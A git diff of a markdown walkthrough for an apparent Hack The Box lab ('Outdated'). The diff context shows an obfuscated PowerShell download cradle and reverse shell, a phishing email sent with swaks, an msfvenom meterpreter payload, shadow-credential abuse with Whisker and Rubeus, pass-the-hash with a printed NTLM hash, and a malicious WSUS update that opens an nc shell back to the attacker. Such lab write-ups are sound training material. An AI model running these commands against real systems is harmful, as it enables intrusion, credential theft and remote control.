@@ -150,6 +150,7 @@ and they must be within the script tag. There is about 6000 or so included in th
 <https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1>
 
 - At the bottom of the script, in order to trigger the reverse connection, we need to append:
+
 ```bash
 Invoke-PowerShellTcp -Reverse -IPAddress <KALI IP> -Port 8081
 
@@ -158,11 +159,13 @@ Invoke-PowerShellTcp -Reverse -IPAddress <KALI IP> -Port 8081
 ![image27](../resources/024a0114938f4b5b83e2868bce54d6a4.png)
 
 - Now we use Invoke-Expression to launch the ps1 file:
+
 ```powershell
 Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8vMTAuMTAuMTQuNjYvSW52b2tlLVBvd2VyU2hlbGxUY3AucHMxIikK'+[char]34+'))')))
 
 ```
 - The bold base64 text above is:
+
 ```bash
 IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.66/Invoke-PowerShellTcp.ps1")
 
@@ -175,16 +178,19 @@ IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.66/Invoke-PowerSh
 
 **<u>Exploit setup:</u>**
 - First we need to host the exploit.html:
+
 ```bash
 sudo python -m http.server 80
 
 ```
 - Set up a listener:
+
 ```bash
 rlwrap -cAr nc -lvnp 8081
 
 ```
 - Send an email to itsupport, with a clickable hyperlink:
+
 ```bash
 swaks -s "mail.outdated.htb" -p "25" -t "itsupport@outdated.htb" -f "dev@outdated" --header "New web application" --body "The new web application http://10.10.14.66/exploit.html"
 
@@ -198,6 +204,7 @@ swaks -s "mail.outdated.htb" -p "25" -t "itsupport@outdated.htb" -f "dev@outdate
 ![image31](../resources/400ae34dfc0047a4a0bb94e5a86abaf9.png)
 
 - Upgrade to meterpreter (or just to have a backup shell):
+
 ```bash
   msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.66 LPORT=4447 -f exe -o reverse.exe
   curl http://10.10.14.66/reverse.exe -o reverse.exe
@@ -210,7 +217,6 @@ swaks -s "mail.outdated.htb" -p "25" -t "itsupport@outdated.htb" -f "dev@outdate
 
 ```bash
 systeminfo
-
 ```
 
 ![image32](../resources/eb9c89e79c85428b82683638ae330d1b.png)
@@ -252,6 +258,7 @@ Got some plain credentials (for the user we already have):
 - **<u>Enumerate the domain:</u>**
 
 - Upload Sharphound:
+
 ```bash
 .\SharpHound.exe --CollectionMethods All --Domain outdated.htb --ZipFileName loot.zip
 
@@ -279,6 +286,7 @@ Got some plain credentials (for the user we already have):
 <https://github.com/jakobfriedl/precompiled-binaries>
 
 - Upload Whisker.exe to target:
+
 ```bash
 .\Whisker.exe add /target:sflowers /domain:outdated.htb
 
@@ -288,19 +296,21 @@ Got some plain credentials (for the user we already have):
 
 - Upload Rubeus:
 - Run the command that was produced by Whisker:
+
 ```bash
 .\Rubeus.exe asktgt /user:sflowers /certificate: <certificate base64> /password:"lxcgCS6Re5JsGCmq" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
-
 ```
 
 ![image43](../resources/80febfa0d07946d88ec76609904867be.png)
 
 - Try and crack it with:
+
 ```bash
 hashcat -m 1000 -a 0 hash /usr/share/wordlists/rockyou.txt
 
 ```
 - What we can do instead is, use the NTLM hash with evil-winrm (as port 5985 is open):
+
 ```bash
 evil-winrm -u sflowers -H "1FCDB1F6015DCB318CC77BB2BDA14DB5" -i outdated.htb
 
@@ -321,6 +331,7 @@ whoami /all
 - One thing that stands out is the group **OUTDATED\WSUS Administrators**
 
 - Check if WSUS is active and being used:
+
 ```bash
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
 
@@ -355,6 +366,7 @@ So we can see that it's using HTTP here
 Hence why we are using PSExec from SysInternals
 
 - Create the malicious WSUS update:
+
 ```bash
 .\SharpWSUS.exe create /payload:"C:\Users\sflowers\Downloads\PsExec64.exe" /args:"-accepteula -s -d c:\\users\\sflowers\\Downloads\\nc.exe -e cmd.exe 10.10.14.66 8444" /title:"Important Update4" /date:2024-01-02 /kb:500130 /rating:Important /description:"Really important update" /url:"https://google.com"
 
@@ -363,6 +375,7 @@ Hence why we are using PSExec from SysInternals
 ![image50](../resources/558b5d2fef64473a8694d37c839d51d5.png)
 
 - Approve the update:
+
 ```bash
 .\SharpWSUS.exe approve /updateid:8a4c761a-4c52-4130-b987-ee1d2cd54b3d /computername:dc.outdated.htb, /groupname:"Important Group1"
 
